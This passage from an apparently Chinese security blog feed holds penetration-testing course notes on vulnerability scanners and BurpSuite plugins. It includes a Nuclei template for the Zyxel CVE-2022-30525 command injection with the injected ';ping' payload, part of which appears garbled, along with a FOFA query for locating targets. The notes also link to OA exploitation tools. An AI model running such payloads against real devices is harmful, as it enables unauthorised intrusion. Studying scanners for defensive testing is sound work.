      
    </entry>
    
    
    
    <entry>
      <title>Day74 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针</title>
      <link href="/2023/03/20/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/"/>
      <url>/2023/03/20/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、浏览器插件&amp;BurpSuite插件</p><p>2、Hack-Tools&amp;pentestkit&amp;fofa_view等</p><p>3、Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4j等</p><p>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！</p><p>具体项目：Burpsuite，Awvs，Xray，Goby，Afrog，Vulmap，Pocassist，Nessus，Nuclei，Pentestkit，Nexpose，BP插件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)。</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、漏洞发现-Web&amp;框架层面</p><p>2、漏洞发现-服务&amp;中间件层面</p><p>3、漏洞发现-APP&amp;小程序层面</p><p>4、漏洞发现-PC操作系统层面</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa_view&amp;Pentestkit</p><p>➢ BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4j</p><h4 id="浏览器插件-辅助-amp-资产-amp-漏洞库-Hack-Tools-amp-Fofa-view-amp-Pentestkit"><a href="#浏览器插件-辅助-amp-资产-amp-漏洞库-Hack-Tools-amp-Fofa-view-amp-Pentestkit" class="headerlink" title="#浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa_view&amp;Pentestkit"></a>#浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa_view&amp;Pentestkit</h4><p>资产：<a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a></p><p>辅助：<a href="https://github.com/LasCC/Hack-Tools">https://github.com/LasCC/Hack-Tools</a></p><p>漏洞库：<a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a></p><h5 id="Hack-Tools（类似棱角社区）"><a href="#Hack-Tools（类似棱角社区）" class="headerlink" title="Hack-Tools（类似棱角社区）"></a>Hack-Tools（类似棱角社区）</h5><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321151906142.png" alt="image-20230321151906142"></p><h5 id="Fofa-view"><a href="#Fofa-view" class="headerlink" title="Fofa_view"></a>Fofa_view</h5><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321150348538.png" alt="image-20230321150348538"></p><h5 id="Pentestkit（信息收集并带有cve检测，waf检测）"><a href="#Pentestkit（信息收集并带有cve检测，waf检测）" class="headerlink" title="Pentestkit（信息收集并带有cve检测，waf检测）"></a>Pentestkit（信息收集并带有cve检测，waf检测）</h5><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321152534777.png" alt="image-20230321152534777"></p><h4 id="BurpSuite插件-被动-amp-特定扫描-Fiora-amp-Spring-amp-Fastjson-amp-Shiro-amp-Log4j"><a href="#BurpSuite插件-被动-amp-特定扫描-Fiora-amp-Spring-amp-Fastjson-amp-Shiro-amp-Log4j" class="headerlink" title="#BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4j"></a>#BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4j</h4><p>1、国内版nuclei:<a href="https://github.com/bit4woo/Fiora">https://github.com/bit4woo/Fiora</a></p><p>该项目为PoC框架<a href="https://github.com/projectdiscovery/nuclei">nuclei</a>提供图形界面，实现快速搜索、一键运行等功能，提升<a href="https://github.com/projectdiscovery/nuclei">nuclei</a>的使用体验。</p><p><a href="https://blog.csdn.net/szgyunyun/article/details/123045104">(22条消息) Burp插件Fiora联动nuclei(windows)_burp nuclei_god_mellon的博客-CSDN博客</a></p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321153030792.png" alt="image-20230321153030792"></p><p>2、<a href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a></p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321161515231.png" alt="image-20230321161515231"></p><p>3、<a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></p><p>随便构造json的post数据包,要不然没有相关内容会出现not supported</p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321160059044.png" alt="image-20230321160059044"></p><p>右键发到fastjson</p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321160607793.png" alt="image-20230321160607793"></p><p><a href="https://github.com/bigsizeme/Log4j-check(Fiora%E5%8F%AF%E4%BB%A5%E6%A3%80%E6%B5%8B)">https://github.com/bigsizeme/Log4j-check(Fiora可以检测)</a></p><p><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a></p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321161036282.png" alt="image-20230321161036282"></p><p>国外版nuclei:<a href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p><p><img src="/../images/Day74-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88/image-20230321163459170.png" alt="image-20230321163459170"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞发现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day73 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus&amp;Nexpose&amp;Goby</title>
      <link href="/2023/03/20/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/"/>
      <url>/2023/03/20/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Goby 简单介绍&amp;使用说明</p><p>2、Nuclei 简单介绍&amp;使用说明</p><p>3、Nessus 简单介绍&amp;使用说明</p><p>4、Nexpose 简单介绍&amp;使用说明</p><p>5、掌握工具安装使用&amp;原理&amp;联动&amp;适用</p><p>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！</p><p>具体项目：Burpsuite，Awvs，Xray，Goby，Afrog，Vulmap，Pocassist，Nessus，Nuclei，Pentestkit，Nexpose，BP插件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)。</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、漏洞发现-Web&amp;框架层面</p><p>2、漏洞发现-服务&amp;中间件层面</p><p>3、漏洞发现-APP&amp;小程序层面</p><p>4、漏洞发现-PC操作系统层面</p><h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。</p><h5 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h5><p>Nuclei是一款基于YAML语法模板的开发的定制化快速漏洞扫描器。它使用Go语言开发，具有很强的可配置性、可扩展性和易用性。 提供 TCP、DNS、HTTP、FILE 等各类协议的扫描，通过强大且灵活的模板，可以使用 Nuclei 模拟各种安全检查。</p><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。</p><h5 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h5><p>Nexpose 是 Rapid7 出品，一款著名的、极佳的商业漏洞扫描工具。跟一般的扫描工具不同，Nexpose 自身的功能非常强大，可以更新其漏洞数据库，以保证最新的漏洞被扫描到。漏洞扫描效率非常高，对于大型复杂网络，可优先考虑使用；对于大型复杂网络，可以优先考虑使用。可以给出哪些漏洞可以被 Metasploit Exploit，哪些漏洞在 Exploit-db 里面有 exploit 的方案。可以生成非常详细的，非常强大的 Report，涵盖了很多统计功能和漏洞的详细信息。虽然没有Web应用程序扫描，但Nexpose涵盖自动漏洞更新以及微软补丁星期二漏洞更新。</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Nessus&amp;Nexpose漏扫操作系统漏洞</p><p>➢ Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞</p><p>➢ Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</p><p>➢ FofaMAP&amp;Nuclei漏扫自动化特定项目漏洞</p><h5 id="项目资源："><a href="#项目资源：" class="headerlink" title="项目资源："></a>项目资源：</h5><p>Goby：<a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p><p>Nuclei：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p>Nessus：<a href="https://mp.weixin.qq.com/s/G-7Yu8sefH3Bo3GRtUo2EA">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bo3GRtUo2EA</a></p><p>Nexpose：<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p><p>FofaMAP：<a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p><h4 id="案例1-Nessus-amp-Nexpose漏扫操作系统漏洞"><a href="#案例1-Nessus-amp-Nexpose漏扫操作系统漏洞" class="headerlink" title="#案例1-Nessus&amp;Nexpose漏扫操作系统漏洞"></a>#案例1-Nessus&amp;Nexpose漏扫操作系统漏洞</h4><h5 id="Nexpose-1"><a href="#Nexpose-1" class="headerlink" title="Nexpose"></a>Nexpose</h5><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321113226278.png" alt="image-20230321113226278"></p><h5 id="Nessus-1"><a href="#Nessus-1" class="headerlink" title="Nessus"></a>Nessus</h5><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321113435710.png" alt="image-20230321113435710"></p><h4 id="案例2-Goby-amp-Nuclei漏扫系统-amp-服务-amp-中间件漏洞"><a href="#案例2-Goby-amp-Nuclei漏扫系统-amp-服务-amp-中间件漏洞" class="headerlink" title="#案例2-Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞"></a>#案例2-Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞</h4><p>Nuclei -u <a href="http://xxxxxxx/">http://xxxxxxx</a></p><p>goby和Nuclei比较擅长扫描web类的资产漏洞，对于操作系统上的不怎么成熟</p><h4 id="案例3-Nuclei漏扫特定资产-amp-模版导入-amp-最新漏洞"><a href="#案例3-Nuclei漏扫特定资产-amp-模版导入-amp-最新漏洞" class="headerlink" title="#案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞"></a>#案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</h4><p><a href="https://blog.csdn.net/asaotomo/article/details/122395708">(22条消息) Nuclei——一款基于YAML语法模板的快速漏洞扫描工具_asaotomo的博客-CSDN博客</a></p><h5 id="例子：CVE-2022-30525-Zyxel-防火墙远程命令注入漏洞"><a href="#例子：CVE-2022-30525-Zyxel-防火墙远程命令注入漏洞" class="headerlink" title="例子：CVE-2022-30525: Zyxel 防火墙远程命令注入漏洞"></a>例子：CVE-2022-30525: Zyxel 防火墙远程命令注入漏洞</h5><p>自己可以写poc模板，可以用自带的，也可以自己写的</p><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321115128998.png" alt="image-20230321115128998"></p><p>-t参数指定某个模板，不加则默认为所有模板，-u 指定url，-l 将批量的url写在txt文件</p><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321122650010.png" alt="image-20230321122650010"></p><p>-tags指定标签，扫描这个相关的</p><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321123015485.png" alt="image-20230321123015485"></p><p>自写模板</p><blockquote><p>FofaViewer：title&#x3D;&#x3D;”USG FLEX 50 (USG20-VPN)”</p><p>nuclei.exe -t Zyxel.yaml -l z.txt</p><p>Zyxel.yaml：</p><p>id: CVE-2022-30525</p><p>info:</p><p>  name: cx</p><p>  author: remote</p><p>  severity: high</p><p>  tags: CVE-2022-30525</p><p>  reference: CVE-2022-30525</p><p>requests:</p><p>  - raw:</p><p>​      - |</p><p>​        POST &#x2F;ztp&#x2F;cgi-bin&#x2F;handler HTTP&#x2F;1.1</p><p>​        Host: </p><p>​        Content-Type: application&#x2F;json; charset&#x3D;utf-8</p><p>​        </p><p>​        {“command”: “setWanPortSt”,”proto”: “dhcp”,”port”: “1270”,”vlan_tagged”: “1270”,”vlanid”: “1270”,”mtu”: ““,”data”:””}</p><p>​        </p><p>​        </p><p>​    payloads:</p><p>​      exploit:</p><p>​        - “;ping -c 3 NaN;”</p><p>​    attack: pitchfork</p><p>​    matchers:</p><p>​      - type: word</p><p>​        part: interactsh_protocol</p><p>​        name: dns</p><p>​        words:</p><p>​          - “dns”</p></blockquote><h4 id="案例4-FofaMAP-amp-Nuclei漏扫自动化特定资产漏洞"><a href="#案例4-FofaMAP-amp-Nuclei漏扫自动化特定资产漏洞" class="headerlink" title="#案例4-FofaMAP&amp;Nuclei漏扫自动化特定资产漏洞"></a>#案例4-FofaMAP&amp;Nuclei漏扫自动化特定资产漏洞</h4><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321124430528.png" alt="image-20230321124430528"></p><p>思路</p><p><img src="/../images/Day73-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby/image-20230321125430863.png" alt="image-20230321125430863"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞发现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day72 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</title>
      <link href="/2023/03/20/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/"/>
      <url>/2023/03/20/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Burp 简单介绍&amp;使用说明</p><p>2、Xray 简单介绍&amp;使用说明</p><p>3、Awvs 简单介绍&amp;使用说明</p><p>4、Goby 简单介绍&amp;使用说明</p><p>5、Afrog 简单介绍&amp;使用说明</p><p>6、Vulmap 简单介绍&amp;使用说明</p><p>7、Pocassist 简单介绍&amp;使用说明</p><p>8、掌握工具安装使用&amp;原理&amp;联动&amp;适用</p><p>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！</p><p>具体项目：Burpsuite，Awvs，Xray，Goby，Afrog，Vulmap，Pocassist，Nessus，Nuclei，Pentestkit，Kunyu，BP插件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)等。</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、漏洞发现-Web&amp;框架层面</p><p>2、漏洞发现-服务&amp;中间件层面</p><p>3、漏洞发现-APP&amp;小程序层面</p><p>4、漏洞发现-PC操作系统层面</p><h4 id="Acunetix"><a href="#Acunetix" class="headerlink" title="Acunetix"></a>Acunetix</h4><p>Acunetix一款商业的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个操作方便的图形用户界面，并且能够创建专业级的Web站点安全审核报告。新版本集成了漏洞管理功能来扩展企业全面管理、优先级和控制漏洞威胁的能力。</p><p>缺点:<img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321000500961.png" alt="image-20230321000500961"></p><h4 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h4><p>Burp Suite是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h4 id="pocassist"><a href="#pocassist" class="headerlink" title="pocassist"></a>pocassist</h4><p>pocassist是一个 Golang 编写的全新开源漏洞测试框架。实现对poc的在线编辑、管理、测试。如果你不想撸代码，又想实现poc的逻辑，又想在线对靶机快速测试，那就使用pocassist吧。完全兼容xray，但又不仅仅是xray。除了支持定义目录级漏洞poc，还支持服务器级漏洞、参数级漏洞、url级漏洞以及对页面内容检测，如果以上还不满足你的需求，还支持加载自定义脚本。</p><h4 id="afrog-常更新"><a href="#afrog-常更新" class="headerlink" title="afrog(常更新)"></a>afrog(常更新)</h4><p>afrog 是一款性能卓越、快速稳定、PoC 可定制的漏洞扫描（挖洞）工具，PoC 涉及 CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。</p><h4 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h4><p>Xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows &#x2F;macOS &#x2F;Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p><p>扫描APP网站</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321010547113.png" alt="image-20230321010547113"></p><h4 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h4><p>Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。</p><h4 id="Vulmap"><a href="#Vulmap" class="headerlink" title="Vulmap"></a>Vulmap</h4><p>Vulmap是一款 web 漏洞扫描和验证工具, 可对 webapps 进行漏洞扫描, 并且具备漏洞利用功能, 目前支持的 webapps 包括 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, fastjson, jenkins, nexus, weblogic, jboss, spring, thinkphp</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray</p><p>➢ Vulfocus-框架扫描-特定-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist</p><p>➢ 某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap</p><h4 id="项目资源："><a href="#项目资源：" class="headerlink" title="项目资源："></a>项目资源：</h4><p><a href="https://www.ddosi.org/awvs14-6-log4j-rce/">https://www.ddosi.org/awvs14-6-log4j-rce/</a></p><p><a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a></p><p><a href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a></p><p><a href="https://github.com/zhzyker/vulmap/releases">https://github.com/zhzyker/vulmap/releases</a></p><p><a href="https://github.com/jweny/pocassist/releases">https://github.com/jweny/pocassist/releases</a></p><p><a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p><h4 id="其他特扫："><a href="#其他特扫：" class="headerlink" title="其他特扫："></a>其他特扫：</h4><p>1、GUI_TOOLS_V6.1_by安全圈小王子–bugfixed</p><p>2、CMS漏洞扫描器名称支持的CMS平台</p><p>DroopescanWordPress，Joomla，Drupal，Moodle，SilverStripe</p><p>CMSmapWordPress，Joomla，Drupal，Moodle</p><p>CMSeeKWordPress，Joomla，Drupal等</p><p>WPXFWordPress</p><p>WPScanWordPress</p><p>WPSekuWordPress</p><p>WPForceWordPress</p><p>JoomScanJoomla</p><p>JoomlaVSJoomla</p><p>JScannerJoomla</p><p>DrupwnDrupal</p><p>Typo3ScanTypo3</p><p>致远OA综合利用工具<a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a>seeyon_exp</p><p>通达OA综合利用工具<a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a>TDOA_RCE</p><p>蓝凌OA漏洞利用工具&#x2F;前台无条件RCE&#x2F;文件写入<a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a>LandrayExploit</p><p>泛微OA漏洞综合利用脚本<a href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a>weaver_exp</p><p>锐捷网络EG易网关RCE批量安全检测<a href="https://github.com/Tas9er/EgGateWayGetShell">https://github.com/Tas9er/EgGateWayGetShell</a>EgGateWayGetShell</p><p>CMSmap 针对流行CMS进行安全扫描的工具<a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a>CMSmap</p><p>使用Go开发的WordPress漏洞扫描工具<a href="https://github.com/blackbinn/wprecon">https://github.com/blackbinn/wprecon</a>wprecon</p><p>一个 Ruby 框架，旨在帮助对 WordPress 系统进行渗透测试<a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a>wordpress-exploit-framework</p><p>WPScan WordPress 安全扫描器<a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a>wpscan</p><p>WPForce Wordpress 攻击套件<a href="https://github.com/n00py/WPForce">https://github.com/n00py/WPForce</a>WPForce</p><h4 id="某APP-Web扫描-常规-amp-联动-Burp-amp-Awvs-amp-Xray"><a href="#某APP-Web扫描-常规-amp-联动-Burp-amp-Awvs-amp-Xray" class="headerlink" title="#某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray"></a>#某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray</h4><h5 id="案例：配合联动对某APP进行安全检查评估"><a href="#案例：配合联动对某APP进行安全检查评估" class="headerlink" title="案例：配合联动对某APP进行安全检查评估"></a>案例：配合联动对某APP进行安全检查评估</h5><p>-对比工具优缺点</p><p>-对比工具使用方法</p><h5 id="Awvs："><a href="#Awvs：" class="headerlink" title="Awvs："></a>Awvs：</h5><p>任务添加&amp;数据头部&amp;代理模式&amp;扫描模式等</p><p>example：<a href="http://demo.aisec.cn/">http://demo.aisec.cn/</a></p><h5 id="Xray："><a href="#Xray：" class="headerlink" title="Xray："></a>Xray：</h5><p>主动扫描&amp;被动扫描&amp;POC资源等</p><p>.\xray_windows_amd64.exe webscan –basic-crawler <a 